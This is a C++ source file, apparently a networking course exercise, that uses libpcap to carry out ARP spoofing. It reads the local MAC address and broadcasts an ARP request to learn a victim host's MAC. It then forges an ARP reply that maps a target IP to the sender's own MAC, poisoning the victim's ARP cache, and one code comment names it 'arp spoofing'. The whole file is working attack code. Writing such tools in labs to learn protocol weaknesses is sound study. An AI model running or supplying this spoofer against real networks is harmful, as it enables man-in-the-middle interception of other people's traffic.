#include "sendarp.h"
#define MAX_MAC_ADDR_LEN 18
#define ETHERTYPE_ARP            "0806"  /* ARP protocol */
char sender_mac[MAX_MAC_ADDR_LEN];
char self_mac[MAX_MAC_ADDR_LEN];


void GetSelfMac(char* device){
    // added
    int sock;
    struct ifreq ifr;
    //char mac_addr[MAX_MAC_ADDR_LEN];

    // Open socket to get MAC address
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return;
    }

    // Get MAC address of wlan0 interface
    strncpy(ifr.ifr_name, device, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return;
    }

    // Convert MAC address to string format
    snprintf(self_mac, MAX_MAC_ADDR_LEN, "%02x:%02x:%02x:%02x:%02x:%02x",
             (unsigned char)ifr.ifr_hwaddr.sa_data[0],
             (unsigned char)ifr.ifr_hwaddr.sa_data[1],
             (unsigned char)ifr.ifr_hwaddr.sa_data[2],
             (unsigned char)ifr.ifr_hwaddr.sa_data[3],
             (unsigned char)ifr.ifr_hwaddr.sa_data[4],
             (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    // Print MAC address
    printf("MAC Address of %s: %s\n",device, self_mac);

    // Close socket
    close(sock);

    return;
}

void GetSenderMac(pcap_t* handle, char *self_ip, char *sender_ip)
{
    // send ARP Request to sender ip

    EthArpPacket packet;
    // execute the program, reply will come
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // put ff:~ff, when you put specific dmac, it arp
    packet.eth_.smac_ = Mac(self_mac); // self mac
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(self_mac);
    packet.arp_.sip_ = htonl(Ip(self_ip)); // change it to my ip
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // when you arp spoofing, it doesn't affect
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // receive ARP reply from sender ip
    struct pcap_pkthdr* header;
    const u_char* rcv_packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &rcv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        printf("%u bytes captured\n", header->caplen); // byte length
        char type[5];
        sprintf(type, "%02X%02X", rcv_packet[12], rcv_packet[13]);
        printf("type : %s\n", type);

        //ETHERNET Header//
        if(strcmp(type, ETHERTYPE_ARP) != 0)continue; // I will check IP Headers existence. IF not, return to while frist part

        const u_char* rcv_arp_packet = rcv_packet + 14;
        char sip[16];
        sprintf(sip, "%d.%d.%d.%d", rcv_arp_packet[14], rcv_arp_packet[15], rcv_arp_packet[16], rcv_arp_packet[17]);
        if(strcmp(sender_ip, sip)!=0)continue;

        sprintf(sender_mac, "%02X:%02X:%02X:%02X:%02X:%02X", rcv_arp_packet[8], rcv_arp_packet[9], rcv_arp_packet[10], rcv_arp_packet[11], rcv_arp_packet[12], rcv_arp_packet[13]);
        printf("Sender Mac Add : %s\n",sender_mac);
        break;
    }
    return;
}

void SendARPReply(pcap_t* handle, char *target_ip, char *sender_ip){
    // send ARP Reply

    EthArpPacket arp_reply_packet;
    // execute the program, reply will come
    arp_reply_packet.eth_.dmac_ = Mac(sender_mac); // put ff:~ff, when you put specific dmac, it arp
    arp_reply_packet.eth_.smac_ = Mac(self_mac); // self mac
    arp_reply_packet.eth_.type_ = htons(EthHdr::Arp);

    arp_reply_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    arp_reply_packet.arp_.pro_ = htons(EthHdr::Ip4);
    arp_reply_packet.arp_.hln_ = Mac::SIZE;
    arp_reply_packet.arp_.pln_ = Ip::SIZE;
    arp_reply_packet.arp_.op_ = htons(ArpHdr::Reply);
    arp_reply_packet.arp_.smac_ = Mac(self_mac);
    arp_reply_packet.arp_.sip_ = htonl(Ip(target_ip)); // receiver ip
    arp_reply_packet.arp_.tmac_ = Mac(sender_mac); // sender mac
    arp_reply_packet.arp_.tip_ = htonl(Ip(sender_ip));  // sender ip

    int arp_rep = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_reply_packet), sizeof(EthArpPacket));
    if (arp_rep!= 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n",arp_rep, pcap_geterr(handle));
    }

    pcap_close(handle);
}
